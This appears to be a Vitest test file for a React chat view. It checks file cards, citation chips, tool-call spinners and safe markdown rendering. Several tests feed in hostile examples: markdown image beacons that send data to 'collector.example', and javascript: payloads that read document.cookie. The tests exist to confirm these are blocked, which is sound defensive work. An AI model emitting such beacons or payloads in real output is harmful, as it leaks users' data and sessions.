// @vitest-environment jsdom
import { act, fireEvent, render, screen } from '@testing-library/react';

// jsdom doesn't implement scrollIntoView; ChatView's messages-end effect calls
// it unconditionally on every render.
Element.prototype.scrollIntoView = vi.fn();

const { mockInvoke } = vi.hoisted(() => ({ mockInvoke: vi.fn(async () => undefined) }));

vi.mock('../../lib/helperFetch', () => ({
  helperRequest: vi.fn(),
  getTauriInvoke: vi.fn(async () => mockInvoke),
  requireDevBearerToken: vi.fn(),
}));

import ChatView from './ChatView';
import { useChatStore } from '../../stores/chatStore';
import { useWorkspaceStore } from '../../stores/workspaceStore';

function baseChatState(overrides: Record<string, unknown> = {}) {
  return {
    connectionState: 'connected' as const,
    connectionError: null,
    agentConfig: null,
    sessionId: 's1',
    messages: [],
    isStreaming: false,
    error: null,
    username: 'todd',
    sessions: [],
    sessionsLoading: false,
    pendingApproval: null,
    isFlagged: false,
    sendMessage: vi.fn(),
    ...overrides,
  };
}

function renderChatView() {
  return render(<ChatView draft="" setDraft={() => {}} />);
}

beforeEach(() => {
  vi.clearAllMocks();
  mockInvoke.mockResolvedValue(undefined);
  useChatStore.setState(baseChatState());
});

describe('tool_result rendering', () => {
  it('a search_workspace_files tool_result renders a file card list (name + project/docType + Open) instead of nothing', () => {
    useChatStore.setState(
      baseChatState({
        messages: [
          {
            id: 'result-t1',
            role: 'tool_result',
            content: '{}',
            toolName: 'search_workspace_files',
            toolUseId: 't1',
            toolOutput: {
              files: [
                {
                  fileIndexId: 'abc',
                  relPath: 'Projects/Henderson/easement.pdf',
                  project: 'Henderson',
                  docType: 'Easement',
                  openPath: '/srv/share/Projects/Henderson/easement.pdf',
                },
              ],
            },
            createdAt: new Date(),
          },
        ],
      }),
    );

    renderChatView();

    expect(screen.getByText('easement.pdf')).toBeInTheDocument();
    expect(screen.getByText('Henderson — Easement')).toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'Open' })).toBeInTheDocument();
  });

  it('a get_file_passages tool_result (not a file search) still renders nothing, matching today\'s behavior', () => {
    useChatStore.setState(
      baseChatState({
        messages: [
          {
            id: 'result-t2',
            role: 'tool_result',
            content: '{}',
            toolName: 'get_file_passages',
            toolUseId: 't2',
            toolOutput: {
              passages: [
                {
                  fileIndexId: 'abc',
                  relPath: 'Projects/Henderson/easement.pdf',
                  sourceId: 's1',
                  openPath: '/srv/share/Projects/Henderson/easement.pdf',
                  snippet: 'The easement runs along...',
                  score: 0.9,
                },
              ],
            },
            createdAt: new Date(),
          },
        ],
      }),
    );

    const { container } = renderChatView();
    // Only the empty-state / composer chrome renders — no card, no snippet text.
    expect(screen.queryByText('easement.pdf')).not.toBeInTheDocument();
    expect(screen.queryByText(/easement runs along/)).not.toBeInTheDocument();
    expect(container.querySelector('[data-testid="chat-file-card-list"]')).toBeNull();
  });
});

describe('citation chips', () => {
  function messagesWithCitation(content: string) {
    return [
      {
        id: 'result-t1',
        role: 'tool_result' as const,
        content: '{}',
        toolName: 'get_file_passages',
        toolUseId: 't1',
        toolOutput: {
          passages: [
            {
              fileIndexId: 'abc',
              relPath: 'Projects/Henderson/easement.pdf',
              sourceId: 's1',
              openPath: '/srv/share/Projects/Henderson/easement.pdf',
              snippet: 'text',
              score: 0.9,
            },
          ],
        },
        createdAt: new Date(),
      },
      {
        id: 'a1',
        role: 'assistant' as const,
        content,
        createdAt: new Date(),
      },
    ];
  }

  it('a resolvable citation token renders as a chip labeled with the file basename', () => {
    useChatStore.setState(
      baseChatState({
        messages: messagesWithCitation(
          'The easement is described in [file:abc|Projects/Henderson/easement.pdf].',
        ),
      }),
    );

    renderChatView();

    const chip = screen.getByRole('button', { name: 'easement.pdf' });
    expect(chip).toBeInTheDocument();
  });

  it('clicking a citation chip opens the resolved openPath', async () => {
    const recordActivitySpy = vi.spyOn(useWorkspaceStore.getState(), 'recordActivity');
    useChatStore.setState(
      baseChatState({
        messages: messagesWithCitation('See [file:abc|Projects/Henderson/easement.pdf].'),
      }),
    );

    renderChatView();
    fireEvent.click(screen.getByRole('button', { name: 'easement.pdf' }));
    await Promise.resolve();
    await Promise.resolve();

    expect(recordActivitySpy).toHaveBeenCalledWith('abc', 'open', 'todd');
    expect(mockInvoke).toHaveBeenCalledWith('open_workspace_path', {
      input: { path: '/srv/share/Projects/Henderson/easement.pdf' },
    });
  });

  it('a resolved-but-null openPath citation renders a disabled chip that does not open', async () => {
    useChatStore.setState(
      baseChatState({
        messages: [
          {
            id: 'result-t1',
            role: 'tool_result' as const,
            content: '{}',
            toolName: 'get_file_passages',
            toolUseId: 't1',
            toolOutput: {
              passages: [
                {
                  fileIndexId: 'abc',
                  relPath: 'Projects/Henderson/easement.pdf',
                  sourceId: 's1',
                  openPath: null,
                  snippet: 'text',
                  score: 0.9,
                },
              ],
            },
            createdAt: new Date(),
          },
          {
            id: 'a1',
            role: 'assistant' as const,
            content: 'See [file:abc|Projects/Henderson/easement.pdf].',
            createdAt: new Date(),
          },
        ],
      }),
    );

    renderChatView();

    const chip = screen.getByRole('button', { name: 'easement.pdf' });
    expect(chip).toBeDisabled();
    fireEvent.click(chip);
    await Promise.resolve();
    // A disabled chip must not trigger the open path (no Tauri invoke).
    expect(mockInvoke).not.toHaveBeenCalled();
  });

  it('an unresolvable citation id renders as plain text, not a chip', () => {
    useChatStore.setState(
      baseChatState({
        messages: messagesWithCitation('See [file:zzz|Projects/unknown.pdf] for details.'),
      }),
    );

    renderChatView();

    expect(screen.queryByRole('button', { name: 'unknown.pdf' })).not.toBeInTheDocument();
    expect(screen.getByText(/\[file:zzz\|Projects\/unknown\.pdf\]/)).toBeInTheDocument();
  });
});

describe('markdown image and link rendering', () => {
  function assistantMessage(content: string) {
    return [{ id: 'a1', role: 'assistant' as const, content, createdAt: new Date() }];
  }

  it('does not render an <img> element for a model-authored markdown image', () => {
    useChatStore.setState(
      baseChatState({
        messages: assistantMessage(
          'Here is the log summary: ![](https://collector.example/x?d=hostname-and-ip-here)',
        ),
      }),
    );

    const { container } = renderChatView();

    expect(container.querySelector('img')).toBeNull();
  });

  it('renders the image as a click-through link with an http(s) href instead', () => {
    useChatStore.setState(
      baseChatState({ messages: assistantMessage('![beacon](https://collector.example/x?d=secret)') }),
    );

    renderChatView();

    const link = screen.getByRole('link', { name: 'beacon' });
    expect(link).toHaveAttribute('href', 'https://collector.example/x?d=secret');
    expect(link).toHaveAttribute('target', '_blank');
  });

  it('drops a non-http(s) image source (javascript:, data:) without linking it', () => {
    useChatStore.setState(
      baseChatState({ messages: assistantMessage('![payload](javascript:alert(document.cookie))') }),
    );

    const { container } = renderChatView();

    expect(container.querySelector('img')).toBeNull();
    expect(screen.queryByRole('link', { name: 'payload' })).toBeNull();
  });

  it('still renders a plain http(s) markdown link as a clickable anchor', () => {
    useChatStore.setState(
      baseChatState({ messages: assistantMessage('[click me](https://example.com/page)') }),
    );

    renderChatView();

    expect(screen.getByRole('link', { name: 'click me' })).toHaveAttribute(
      'href',
      'https://example.com/page',
    );
  });

  it('does not resolve a javascript: markdown link to an executable href', () => {
    useChatStore.setState(baseChatState({ messages: assistantMessage('[click me](javascript:alert(1))') }));

    renderChatView();

    expect(screen.getByRole('link', { name: 'click me' })).toHaveAttribute('href', '#');
  });
});

describe('tool-call indicator status (#11727)', () => {
  function toolUse(id: string, toolName = 'list_processes') {
    return { id: `tool-${id}`, role: 'tool_use' as const, content: '', toolName, toolUseId: id, createdAt: new Date() };
  }
  function toolResult(id: string, isError = false) {
    return { id: `result-${id}`, role: 'tool_result' as const, content: '{}', toolUseId: id, toolOutput: {}, isError, createdAt: new Date() };
  }
  function user(id: string) {
    return { id, role: 'user' as const, content: 'hi', createdAt: new Date() };
  }
  function indicators() {
    return screen.getAllByTestId('tool-call-indicator');
  }
  function spinners(container: HTMLElement) {
    return container.querySelectorAll('.helper-spinner');
  }

  it('spins while the tool is still running in the current streaming turn', () => {
    useChatStore.setState(baseChatState({ isStreaming: true, messages: [user('u1'), toolUse('t1')] }));
    const { container } = renderChatView();
    expect(indicators()[0]).toHaveAttribute('data-state', 'running');
    expect(spinners(container)).toHaveLength(1);
    expect(screen.getByText('Using list processes...')).toBeInTheDocument();
  });

  it('stops spinning once the matching tool_result arrives, even mid-turn', () => {
    useChatStore.setState(
      baseChatState({
        isStreaming: true,
        messages: [user('u1'), toolUse('t1'), toolResult('t1'), toolUse('t2', 'get_disk_usage')],
      }),
    );
    const { container } = renderChatView();
    const [first, second] = indicators();
    expect(first).toHaveAttribute('data-state', 'done');
    expect(second).toHaveAttribute('data-state', 'running');
    expect(spinners(container)).toHaveLength(1);
    expect(screen.getByText('Used list processes')).toBeInTheDocument();
  });

  it('marks a tool whose result is an error as failed, not running', () => {
    useChatStore.setState(
      baseChatState({ isStreaming: true, messages: [user('u1'), toolUse('t1'), toolResult('t1', true)] }),
    );
    const { container } = renderChatView();
    expect(indicators()[0]).toHaveAttribute('data-state', 'failed');
    expect(spinners(container)).toHaveLength(0);
    // The failure must be in the text, not only the aria-hidden glyph.
    expect(screen.getByText("Couldn't use list processes")).toBeInTheDocument();
    expect(screen.queryByText('Used list processes')).not.toBeInTheDocument();
  });

  it('settles a live indicator when its result is appended, and on turn end', () => {
    useChatStore.setState(baseChatState({ isStreaming: true, messages: [user('u1'), toolUse('t1'), toolUse('t2')] }));
    const { container } = renderChatView();
    expect(spinners(container)).toHaveLength(2);

    act(() => {
      useChatStore.setState({ messages: [user('u1'), toolUse('t1'), toolUse('t2'), toolResult('t1')] });
    });
    expect(indicators().map((el) => el.getAttribute('data-state'))).toEqual(['done', 'running']);

    act(() => {
      useChatStore.setState({ isStreaming: false });
    });
    expect(spinners(container)).toHaveLength(0);
  });

  it('no indicator spins once the turn has finished, even without matched results (reloaded session)', () => {
    // Persisted rows carry no toolUseId, so nothing can be matched by id.
    const reloaded = [
      user('u1'),
      { id: 'm1', role: 'tool_use', content: '', toolName: 'list_processes', createdAt: new Date() },
      { id: 'm2', role: 'tool_result', content: '{}', toolOutput: {}, createdAt: new Date() },
      { id: 'm3', role: 'tool_use', content: '', toolName: 'get_disk_usage', createdAt: new Date() },
      { id: 'm4', role: 'tool_result', content: '{}', toolOutput: {}, createdAt: new Date() },
      { id: 'm5', role: 'assistant', content: 'All good.', createdAt: new Date() },
    ];
    useChatStore.setState(baseChatState({ isStreaming: false, messages: reloaded }));
    const { container } = renderChatView();
    expect(indicators()).toHaveLength(2);
    for (const el of indicators()) expect(el).toHaveAttribute('data-state', 'done');
    expect(spinners(container)).toHaveLength(0);
  });

  it('an unmatched tool from an earlier turn does not spin while a new turn streams', () => {
    useChatStore.setState(
      baseChatState({ isStreaming: true, messages: [user('u1'), toolUse('t1'), user('u2')] }),
    );
    const { container } = renderChatView();
    expect(indicators()[0]).toHaveAttribute('data-state', 'done');
    expect(spinners(container)).toHaveLength(0);
  });
});
